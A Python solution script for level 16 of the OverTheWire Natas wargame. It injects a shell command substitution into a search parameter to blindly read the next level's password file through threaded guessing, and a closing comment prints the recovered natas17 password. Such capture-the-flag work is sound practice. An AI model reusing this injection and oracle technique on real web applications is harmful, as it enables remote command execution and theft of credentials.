from bs4 import BeautifulSoup
import requests
import concurrent.futures
import string

#Perform the request
def req(x):
    res = requests.get(url=url,auth=lvl_pass, params={'needle':f'$(grep {x} /etc/natas_webpass/natas17)Africans'})
    serv = BeautifulSoup(res.text, 'html.parser').body.find('div').text.strip()
    if "Africans" not in serv:
        return x
    else:
        return -1
#Find length of the password
def findLen(num):
    return num if req(f'-Ew .{{{num}}}') != -1 else None
#Find the characters that appear in the password (saves time versus doing findpw() with alphanum)
def filterChars(char):
    return char if req(char) != -1 else None
#Construct the password via a series of guesses as to the position of a given character already known
#to appear in the string
def findpw(g):
    global pw
    if req(f'-E ^{pw+g}') != -1:
        pw +=g
        #print(pw)
        return g
    else:
        return None

def main():
    threads = 30
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        num = executor.map(findLen, list(range(1,40)))
    for x in num:
        if x is not None:
            pw_len = x
    #print("The password is", pw_len, "characters in length.\n")
    with concurrent.futures.ThreadPoolExecutor(max_workers=pw_len) as executor:
        ch = executor.map(filterChars, alphanum)
    for x in ch:
        if x is not None:
            filt_chars.append(x)
    #print('The following characters appear in the password:', ''.join(filt_chars), '\n')
    for x in range(pw_len):
        with concurrent.futures.ThreadPoolExecutor(max_workers=len(filt_chars)) as executor:
            ch = executor.map(findpw, filt_chars)

lvl = '16'
next_level = str(int(lvl)+1)
pwd = open(f"./passwords/{'natas'+'0'+lvl if len(lvl)==1 else 'natas'+lvl}.pwd", 'r').read().strip()
url = f'http://natas{lvl}.natas.labs.overthewire.org'
lvl_pass = requests.auth.HTTPBasicAuth(f'natas{lvl}',pwd)
alphanum = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
filt_chars = []
pw_len = 0
pw = ""

main()

open(f"./passwords/{'natas'+'0'+next_level if len(next_level)==1 else 'natas'+next_level}.pwd", 'w').write(pw)


'''
Shell injection PHP, folks, we love to see it.
We love to see him executing arbitary code on the server!
And folks, we're seeing it more and more.


Username: natas17
Password: XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd

'''